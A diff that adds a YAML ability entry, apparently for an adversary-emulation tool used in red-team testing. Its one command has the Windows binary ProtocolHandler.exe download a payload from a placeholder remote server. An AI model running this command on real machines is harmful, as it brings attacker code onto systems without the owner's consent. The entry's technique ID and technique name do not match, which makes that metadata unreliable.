@@ -1,0 +1,21 @@
+- id: 2274cadd-003a-96d9-0e60-13ac0047d370
+  name: ProtocolHandler.exe - Downloads payload from remote server
+  description: Downloads payload from remote server
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'ProtocolHandler.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Nir Chako
+  created: '2022-07-24'
+  modified: '2022-07-24'
+  operating_system: Windows All Versions
